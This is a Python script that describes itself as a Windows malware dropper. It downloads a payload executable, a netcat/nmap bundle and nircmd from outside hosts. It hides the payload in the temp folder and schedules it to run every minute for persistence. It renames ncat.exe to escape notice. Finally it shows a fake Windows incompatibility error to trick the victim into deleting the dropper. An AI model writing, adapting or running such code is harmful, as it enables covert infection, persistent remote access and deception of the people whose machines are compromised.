#Dropped that will download file from pastebin & schedule it to execute to gain persistence
#can be modified to grab xml file from pastebin & execute SCHTASKS with that SCHTASKS /XML /file-path
import subprocess
import requests
import os
from tkinter import ttk
import tkinter as tk

#payload exe file link here
url = 'https://notabug.org/bennythamanman/command/raw/master/win10.exe'
#netcat package & required DLLs here
url2 = 'https://notabug.org/bennythamanman/command/raw/master/nmap-7.80-win32.zip'
url3 = 'http://nirsoft.net/utils/nircmd.zip'
def download(filename1, url1, url2, zipfile, url3):
    try:
        request = requests.get(url)
        with open(filename1, "wb") as file:
            file.write(request.content)
        file.close()
        subprocess.check_output("move " + filename1 + " " + "%TMP%", shell=True)
        subprocess.check_output("cd %TMP% && SCHTASKS /CREATE /TN Win32start /SC MINUTE /TR %TMP%\\" + filename1 + " /ST 10:00", shell=True)
        os.system("cd %USERPROFILE% && mkdir system32")
        subprocess.check_output("cd %TMP% && attrib +r +h " + filename1, shell=True)
        os.chdir(os.path.join(os.getenv('userprofile'), 'system32'))
        request2 = requests.get(url2)
        with open(zipfile, "wb") as file:
            file.write(request2.content)
        file.close()
        #powershell 5 needed to unzip here
        #subprocess.check_output("unzip " + zipfile, shell=True)
        subprocess.check_output("powershell Expand-Archive -Force " + zipfile + " .", shell=True)
        subprocess.check_output("del " + zipfile, shell=True)
        subprocess.check_output("cd nmap-7.80 && rename ncat.exe A12B12C.exe", shell=True)
        request3 = requests.get(url3)
        with open("tools.zip", "wb") as file:
            file.write(request3.content)
        file.close()
        subprocess.check_output("powershell Expand-Archive -Force " + "tools.zip .", shell=True)
        #subprocess.check_output("unzip " + "tools.zip", shell=True)
        subprocess.check_output("del " + "tools.zip", shell=True)
    except:
        print("an error has occurred...exiting\n")

download('prompt.exe', url, url2, "docx.zip", url3)

# This code will generate a popup to persuade user to delete
# dropper file since I can't figure out how to make the 
# dropper file delete itself
dropperName = 'dropper.exe'
def popup():
    wd = subprocess.check_output("cd \\ && dir /s/b " + dropperName, shell=True)
    msg = "The version of this file is not compatible with the version of Windows you're running. Check \nyour computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit)\n version of the program, and then contact the software publisher."
    small = ("Verdana", 8)
    popup = tk.Tk()
    popup.wm_title(wd)
    popup.geometry("600x90")
    label = ttk.Label(popup, text=msg, font=small)
    label.pack(side="top", padx=10, pady=10)
    b1 = ttk.Button(popup, text="Ok", command = popup.destroy)
    b1.pack()
    popup.mainloop()

popup()
